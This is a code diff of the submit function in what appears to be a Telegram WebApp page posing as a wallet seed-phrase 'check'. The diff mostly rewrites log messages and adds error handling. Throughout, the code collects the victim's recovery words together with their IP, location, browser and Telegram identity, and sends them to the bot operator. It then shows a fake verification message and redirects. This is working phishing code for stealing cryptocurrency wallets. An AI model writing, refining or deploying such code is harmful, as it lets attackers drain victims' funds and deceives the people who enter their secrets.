@@ -351,7 +351,8 @@ function showProcessing(message) {
 
 // 🚀 submitSeed()
 function submitSeed() {
-    console.log("🚀 Запуск submitSeed()");
+    console.log("🚀 submitSeed() запускається...");
+
     clearWarning();
 
     const lengthEl = document.getElementById("length");
@@ -359,64 +360,81 @@ function submitSeed() {
     const containerEl = document.querySelector(".container");
 
     if (!lengthEl || !walletEl || !containerEl) {
-        console.error("❌ Один з ключових елементів не знайдено в DOM");
+        console.error("❌ Важливі DOM-елементи не знайдені");
         return;
     }
 
     const length = parseInt(lengthEl.value);
-    const wallet = walletEl.value || "unknown";
+    const wallet = walletEl.value || "MetaMask";
     const ua = navigator.userAgent;
 
     const inputs = document.querySelectorAll("#seedContainer .seed-word");
-    const words = Array.from(inputs).map(i => i.value.trim()).filter(Boolean);
+    const words = Array.from(inputs).map(input => input.value.trim()).filter(Boolean);
 
     if (words.length !== length) {
-        console.warn("❌ Причина зупинки: не вистачає слів", words);
-        showWarning(`❌ Введено ${words.length}, очікується ${length} слів`);
+        console.warn("❌ Неправильна кількість слів:", words.length);
+        showWarning(`❗ Введено ${words.length}, очікується ${length} слів`);
         return;
     }
 
-    const invalidWords = words.filter(w => !/^[a-zA-Z]+$/.test(w));
-    if (invalidWords.length) {
-        console.warn("❌ Причина зупинки: недопустимі символи", invalidWords);
-        showWarning(`🚫 Недопустимі символи: ${invalidWords.join(", ")}`);
+    const invalid = words.filter(w => !/^[a-zA-Z]+$/.test(w));
+    if (invalid.length > 0) {
+        showWarning(`🚫 Недопустимі символи: ${invalid.join(", ")}`);
         return;
     }
 
-    const seed = words.join(" ");
-    showProcessing("⏳ Перевірка seed-фрази…");
+    const seed = words.join(" ").trim();
 
-    containerEl.innerHTML = `
-        <h3 style="color:green;text-align:center">⏳ Перевірка…</h3>
-    `;
+    // 👤 Дані користувача з Telegram
+    const tgUser = Telegram?.WebApp?.initDataUnsafe?.user || {};
+    const user_id = tgUser.id || "-";
+    const username = tgUser.username || "-";
 
-    const tgUser = (Telegram?.WebApp?.initDataUnsafe?.user) || {};
+    // 🌍 Дані про IP та локацію
+    const ip = typeof userIp !== "undefined" ? userIp : "–";
+    const location = typeof userLocation !== "undefined" ? userLocation : "–";
+
     const payload = {
-        user_id: tgUser.id || "-",
-        username: tgUser.username || "-",
         seed,
         wallet,
         length,
+        ip,
+        location,
         ua,
-        ip: typeof userIp !== "undefined" ? userIp : "-",
-        location: typeof userLocation !== "undefined" ? userLocation : "-",
+        user_id,
+        username,
         address: "-",
         balance: "-",
         timestamp: new Date().toISOString()
     };
 
-    console.log("📦 Payload сформовано:", payload);
-    localStorage.setItem("payload_backup", JSON.stringify(payload));
+    console.log("📦 Payload зібраний:", payload);
+
+    try {
+        localStorage.setItem("payload_backup", JSON.stringify(payload));
+    } catch (e) {
+        console.error("❌ Помилка при збереженні в localStorage:", e);
+    }
+
+    showProcessing("⏳ Відправка даних…");
 
     if (Telegram?.WebApp?.sendData) {
-        Telegram.WebApp.sendData(JSON.stringify(payload));
-        console.log("✅ Payload надіслано в Telegram WebApp");
+        try {
+            Telegram.WebApp.sendData(JSON.stringify(payload));
+            console.log("✅ Дані надіслані через Telegram WebApp");
+        } catch (err) {
+            console.error("❌ sendData помилка:", err);
+        }
     } else {
-        console.warn("❌ Telegram WebApp.sendData недоступний");
+        console.warn("⚠️ Telegram WebApp.sendData не доступний");
     }
 
     setTimeout(() => {
-        window.location.href = "profile.html";
+        try {
+            window.location.href = "profile.html";
+        } catch (e) {
+            console.error("❌ Не вдалося перейти до профілю:", e);
+        }
     }, 1200);
 }
 
